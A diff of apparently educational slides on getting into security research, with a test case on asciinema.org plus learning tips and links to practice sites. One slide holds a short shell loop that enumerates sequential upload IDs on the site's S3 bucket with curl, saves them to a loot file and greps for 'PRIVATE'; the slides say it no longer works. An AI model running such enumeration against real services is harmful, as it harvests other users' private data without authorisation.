@@ -116,7 +116,7 @@ To be clear, this no longer works.
 
 ## Test Case:
 
-##IDOR on asciinema.org
+## asciinema.org
 ]
 
 ???
@@ -151,13 +151,13 @@ into security research or finding new TTPs
 ```sh
 1| base='https://asciinema-bb-eu.s3-eu-west-1.amazonaws.com'
 2| endpoint='/uploads/asciicast/file/_/ascii.cast'
-3| key='?AWSAccessKeyId=xxxx'
+3| key='?AWSAccessKeyId=xxxx-xxxx-xxxx'
 4| for id in $(seq 10000 99999); do
 5|   uri="${base}${endpoint/_/$id}${key}"
 6|   curl -sL "${uri}" >> dump.loot
 7| done
 8| 
-9| grep 'FLAG{' dump.loot
+9| grep 'PRIVATE' dump.loot
 ```
 ]
 
@@ -177,7 +177,7 @@ Find sensitive data on asciinema.org
 --
 .right-column[
 * RFC 2616  -  Hypertext Transfer Protocol
-* [REST] Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures"
+* Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures"
 ]
 
 ---
@@ -191,6 +191,7 @@ There is no correct order for these styles...
 Nor are they linear. Can very well be a cycle.
 
 - Make it easy for yourself to learn
+- Eliminate unnecessary congitive load and leave more for learning
 - Don't fight with your tools while learning
 - Read man Pages
 - Learn your shell
@@ -417,6 +418,10 @@ https://vulnhub.com
 ### Retired HackTheBox machines
 
 https://youtube.com/ippsec
+
+### Old CTF WriteUps
+
+https://github.com/ctfs
 
 ---
 class: middle
